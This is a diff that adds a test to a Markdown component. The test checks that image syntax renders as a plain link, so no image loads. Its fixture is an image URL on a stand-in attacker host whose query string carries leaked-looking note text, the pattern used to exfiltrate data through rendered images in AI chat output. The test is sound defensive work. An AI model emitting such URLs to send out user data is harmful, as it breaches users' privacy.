@@ -31,4 +31,14 @@ describe("Markdown", () => {
     expect(link.getAttribute("rel")).toBe("noopener noreferrer")
     expect(container.querySelector("img")).toBeNull()
   })
+
+  it("loads no images: a Markdown image becomes a link to it", () => {
+    const url = "https://attacker.example/p.png?q=the%20other%20notes"
+    const { container } = render(<Markdown source={`Summary\n\n![chart](${url}) and ![](${url}#2)`} />)
+    expect(container.querySelector("img")).toBeNull()
+    const link = screen.getByRole("link", { name: "chart" })
+    expect(link.getAttribute("href")).toBe(url)
+    expect(link.getAttribute("rel")).toBe("noopener noreferrer")
+    expect(screen.getByRole("link", { name: "Image" }).getAttribute("href")).toBe(`${url}#2`)
+  })
 })
